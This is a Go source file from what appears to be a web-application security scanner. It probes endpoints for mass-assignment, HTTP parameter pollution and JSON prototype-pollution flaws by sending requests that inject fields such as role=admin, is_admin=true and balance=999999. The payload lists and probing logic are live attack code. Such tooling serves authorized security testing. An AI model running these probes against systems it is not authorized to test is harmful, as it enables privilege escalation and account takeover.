package detector

import (
	"encoding/json"
	"strings"

	"idorplus/pkg/client"

	"github.com/go-resty/resty/v2"
)

// MassAssignmentTester tests for mass assignment vulnerabilities
type MassAssignmentTester struct {
	client *client.SmartClient
}

// MassAssignmentResult represents test result
type MassAssignmentResult struct {
	URL              string
	Method           string
	TestedParams     []string
	VulnerableParams []string
	IsVulnerable     bool
	Evidence         string
}

// NewMassAssignmentTester creates a new tester
func NewMassAssignmentTester(c *client.SmartClient) *MassAssignmentTester {
	return &MassAssignmentTester{client: c}
}

// GetSensitiveParams returns common sensitive parameters to test
func (m *MassAssignmentTester) GetSensitiveParams() []string {
	return []string{
		// Privilege escalation
		"role", "admin", "is_admin", "isAdmin", "administrator",
		"permission", "permissions", "privilege", "privileges",
		"access_level", "accessLevel", "user_type", "userType",

		// Account takeover
		"email", "password", "password_hash", "passwordHash",
		"verified", "is_verified", "isVerified", "email_verified",
		"confirmed", "active", "status", "account_status",

		// Financial
		"balance", "credits", "points", "amount", "price",
		"discount", "coupon", "premium", "subscription",

		// Ownership
		"user_id", "userId", "owner_id", "ownerId", "account_id",
		"org_id", "organization_id", "tenant_id", "tenantId",

		// Metadata
		"created_at", "updated_at", "deleted_at", "internal",
		"debug", "_internal", "__proto__", "constructor",
	}
}

// TestEndpoint tests an endpoint for mass assignment
func (m *MassAssignmentTester) TestEndpoint(url, method string, basePayload map[string]interface{}) *MassAssignmentResult {
	result := &MassAssignmentResult{
		URL:    url,
		Method: method,
	}

	sensitiveParams := m.GetSensitiveParams()
	result.TestedParams = sensitiveParams

	// Get baseline response first
	baselineResp := m.sendRequest(url, method, basePayload)
	if baselineResp == nil {
		return result
	}
	baselineBody := string(baselineResp.Body())

	// Test each sensitive parameter
	for _, param := range sensitiveParams {
		testPayload := copyMap(basePayload)

		// Add sensitive param with privilege value
		switch param {
		case "role", "user_type", "userType":
			testPayload[param] = "admin"
		case "admin", "is_admin", "isAdmin", "administrator":
			testPayload[param] = true
		case "balance", "credits", "points":
			testPayload[param] = 999999
		case "verified", "is_verified", "active":
			testPayload[param] = true
		default:
			testPayload[param] = "injected_value"
		}

		resp := m.sendRequest(url, method, testPayload)
		if resp == nil {
			continue
		}

		// Check if parameter was accepted
		if m.wasParamAccepted(baselineBody, string(resp.Body()), param) {
			result.VulnerableParams = append(result.VulnerableParams, param)
		}
	}

	result.IsVulnerable = len(result.VulnerableParams) > 0
	if result.IsVulnerable {
		result.Evidence = "Accepted parameters: " + strings.Join(result.VulnerableParams, ", ")
	}

	return result
}

// TestParameterPollution tests for HTTP Parameter Pollution
func (m *MassAssignmentTester) TestParameterPollution(url string, paramName string, values []string) []string {
	var vulnerablePatterns []string

	// Test duplicate parameter names
	// ?id=1&id=2 - some backends take first, some take last, some take all
	for i := 0; i < len(values)-1; i++ {
		testURL := url + "?" + paramName + "=" + values[i] + "&" + paramName + "=" + values[i+1]
		resp, err := m.client.Request().Get(testURL)
		if err != nil {
			continue
		}

		body := string(resp.Body())
		// Check which value was used
		if strings.Contains(body, values[i+1]) && !strings.Contains(body, values[i]) {
			vulnerablePatterns = append(vulnerablePatterns, "LAST_PARAM_WINS: "+testURL)
		} else if strings.Contains(body, values[i]) && strings.Contains(body, values[i+1]) {
			vulnerablePatterns = append(vulnerablePatterns, "BOTH_PARAMS: "+testURL)
		}
	}

	// Test array notation
	arrayURLs := []string{
		url + "?" + paramName + "[]=1&" + paramName + "[]=2",
		url + "?" + paramName + "[0]=1&" + paramName + "[1]=2",
		url + "?" + paramName + "=1," + paramName + "=2",
	}

	for _, testURL := range arrayURLs {
		resp, err := m.client.Request().Get(testURL)
		if err != nil {
			continue
		}

		if resp.StatusCode() == 200 {
			vulnerablePatterns = append(vulnerablePatterns, "ARRAY_NOTATION: "+testURL)
		}
	}

	return vulnerablePatterns
}

// TestJSONInjection tests for JSON injection in parameters
func (m *MassAssignmentTester) TestJSONInjection(url, method string, basePayload map[string]interface{}) []string {
	var vulnerabilities []string

	injectionPayloads := []struct {
		name    string
		payload map[string]interface{}
	}{
		{
			"prototype_pollution",
			map[string]interface{}{"__proto__": map[string]interface{}{"admin": true}},
		},
		{
			"constructor_pollution",
			map[string]interface{}{"constructor": map[string]interface{}{"prototype": map[string]interface{}{"admin": true}}},
		},
		{
			"nested_object_injection",
			map[string]interface{}{"user": map[string]interface{}{"role": "admin"}},
		},
	}

	for _, inj := range injectionPayloads {
		testPayload := copyMap(basePayload)
		for k, v := range inj.payload {
			testPayload[k] = v
		}

		resp := m.sendRequest(url, method, testPayload)
		if resp != nil && resp.StatusCode() == 200 {
			// Check if injection was processed
			if strings.Contains(string(resp.Body()), "admin") {
				vulnerabilities = append(vulnerabilities, inj.name)
			}
		}
	}

	return vulnerabilities
}

func (m *MassAssignmentTester) sendRequest(url, method string, payload map[string]interface{}) *resty.Response {
	body, _ := json.Marshal(payload)

	req := m.client.Request().
		SetHeader("Content-Type", "application/json").
		SetBody(body)

	var resp *resty.Response
	var err error

	switch method {
	case "POST":
		resp, err = req.Post(url)
	case "PUT":
		resp, err = req.Put(url)
	case "PATCH":
		resp, err = req.Patch(url)
	default:
		resp, err = req.Post(url)
	}

	if err != nil {
		return nil
	}
	return resp
}

func (m *MassAssignmentTester) wasParamAccepted(baseline, response, param string) bool {
	// If response differs significantly and status is still 200
	// the parameter might have been accepted
	if strings.Contains(response, param) && !strings.Contains(baseline, param) {
		return true
	}

	// Check if response contains our injected value
	if strings.Contains(response, "admin") || strings.Contains(response, "999999") {
		return true
	}

	return false
}

func copyMap(m map[string]interface{}) map[string]interface{} {
	result := make(map[string]interface{})
	for k, v := range m {
		result[k] = v
	}
	return result
}
